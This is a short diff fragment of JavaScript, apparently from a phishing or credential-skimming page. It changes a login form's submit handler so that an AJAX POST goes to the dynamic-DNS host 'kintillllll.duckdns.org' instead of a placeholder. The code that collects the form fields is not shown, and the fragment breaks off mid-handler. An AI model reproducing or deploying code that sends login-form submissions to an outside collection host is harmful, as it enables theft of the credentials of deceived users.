@@ -4,7 +4,7 @@ $(".login-form").submit(function() {
 
 	$.ajax({
 
-        url: "domain mu",
+        url: "kintillllll.duckdns.org",
 
         type: "POST",
 
